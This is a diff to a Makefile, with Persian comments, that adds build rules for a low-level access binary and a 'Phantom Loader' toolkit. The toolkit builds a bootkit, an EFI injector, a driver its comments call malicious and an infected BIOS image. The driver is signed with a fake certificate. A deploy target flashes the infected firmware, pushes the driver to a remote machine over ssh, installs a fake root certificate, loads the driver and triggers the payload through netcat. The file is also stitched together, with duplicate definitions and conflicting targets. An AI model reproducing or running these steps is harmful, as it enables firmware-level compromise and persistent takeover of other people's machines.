@@ -217,3 +217,124 @@ encrypt:
     $(PYTHON) scripts/encryptor.py --key $(ENCRYPTION_KEY) --input omni-zero.tar.gz --output omni-zero.enc
 
     
+# سیستم ساخت OmniLowLevelAccess
+
+ASM = nasm
+LD = ld
+ASMFLAGS = -f elf64 -O3 -F dwarf -g
+LDFLAGS = -T linker.ld -nostdlib -static -z max-page-size=0x1000
+OBJCOPY = objcopy
+STRIP = strip
+
+TARGET = omni_low_level.bin
+
+SRC_DIR = .
+CORE_DIR = $(SRC_DIR)/core
+DRIVERS_DIR = $(SRC_DIR)/drivers
+INTERFACES_DIR = $(SRC_DIR)/interfaces
+LIB_DIR = $(SRC_DIR)/lib
+
+SRCS = $(CORE_DIR)/memory_manager.asm \
+       $(CORE_DIR)/cpu_control.asm \
+       $(CORE_DIR)/hardware_access.asm \
+       $(CORE_DIR)/interrupt_controller.asm \
+       $(CORE_DIR)/dma_manager.asm \
+       $(DRIVERS_DIR)/pci_driver.asm \
+       $(DRIVERS_DIR)/spi_flash_driver.asm \
+       $(DRIVERS_DIR)/nvme_controller.asm \
+       $(INTERFACES_DIR)/bios_interface.asm \
+       $(INTERFACES_DIR)/acpi_interface.asm \
+       $(INTERFACES_DIR)/smm_interface.asm \
+       $(LIB_DIR)/util.asm \
+       $(LIB_DIR)/encryption.asm \
+       main.asm
+
+OBJS = $(SRCS:.asm=.o)
+
+.PHONY: all clean
+
+all: $(TARGET)
+
+$(TARGET): $(OBJS)
+    $(LD) $(LDFLAGS) -o $@ $^
+    $(OBJCOPY) -O binary $@ $@.bin
+    $(STRIP) -s $@
+
+%.o: %.asm
+    $(ASM) $(ASMFLAGS) -o $@ $<
+
+clean:
+    rm -f $(OBJS) $(TARGET) $(TARGET).bin
+
+# سیستم ساخت Phantom Loader
+
+# تنظیمات
+ASM = nasm
+LD = ld
+CC = gcc
+CFLAGS = -O3 -Wall -Wextra -fno-stack-protector -fPIC
+ASMFLAGS = -f elf64 -O3 -F dwarf -g
+LDFLAGS = -T linker.ld -nostdlib -z max-page-size=0x1000
+OBJCOPY = objcopy
+STRIP = strip
+SIGN_TOOL = python3 tools/sign_tool.py
+FIRMWARE_TOOL = python3 tools/firmware_tool.py
+
+# فایل‌ها
+CORE_SRCS = core/bootkit.asm core/efi_injector.asm core/driver_exploit.asm core/stealth.asm
+PAYLOAD_SRCS = payload/kernel_module.asm payload/persistence.asm
+INTERFACE_SRCS = interfaces/uefi.inc interfaces/acpi.inc interfaces/smm.inc
+TOOLS = tools/sign_tool.py tools/firmware_tool.py
+
+# اهداف
+TARGETS = phantom_bootkit.bin phantom_efi_module.efi phantom_driver.sys
+
+.PHONY: all clean deploy
+
+all: $(TARGETS)
+
+# ساخت بوت‌کیت
+phantom_bootkit.bin: core/bootkit.asm
+	$(ASM) $(ASMFLAGS) -o $@.o $<
+	$(LD) $(LDFLAGS) -o $@.elf $@.o
+	$(OBJCOPY) -O binary $@.elf $@
+	$(STRIP) -s $@.elf
+
+# ساخت ماژول EFI
+phantom_efi_module.efi: core/efi_injector.asm interfaces/uefi.inc
+	$(ASM) $(ASMFLAGS) -o $@.o $<
+	$(LD) $(LDFLAGS) -o $@.elf $@.o
+	$(OBJCOPY) -O binary $@.elf $@
+
+# ساخت درایور مخرب
+phantom_driver.sys: core/driver_exploit.asm
+	$(ASM) $(ASMFLAGS) -o $@.o $<
+	$(LD) $(LDFLAGS) -o $@.elf $@.o
+	$(OBJCOPY) -O binary $@.elf $@
+	$(SIGN_TOOL) -d $@ -c certs/fake_cert.pem -k certs/fake_key.pem
+
+# ساخت فریم‌ور آلوده
+infected_bios.bin: firmware/original_bios.bin payload/kernel_module.asm
+	$(FIRMWARE_TOOL) -f firmware/original_bios.bin -p payload/kernel_payload.bin -o $@
+
+# استقرار
+deploy: infected_bios.bin phantom_driver.sys
+	# فلش فریم‌ور آلوده
+	flashrom -p internal -w infected_bios.bin
+	
+	# نصب درایور مخرب
+	scp phantom_driver.sys root@target:/tmp/
+	ssh root@target "certutil -addstore root fake_cert.pem"
+	ssh root@target "drvload /tmp/phantom_driver.sys"
+	
+	# فعال‌سازی پیلود
+	ssh root@target "echo ACTIVATE | nc localhost 31337"
+
+# پاک‌سازی
+clean:
+	rm -f *.o *.elf *.bin *.sys *.efi
+	rm -f infected_bios.bin
+
+all:
+	nasm -f elf64 ../src/main.asm -o omni.o
+	ld -o omni omni.o
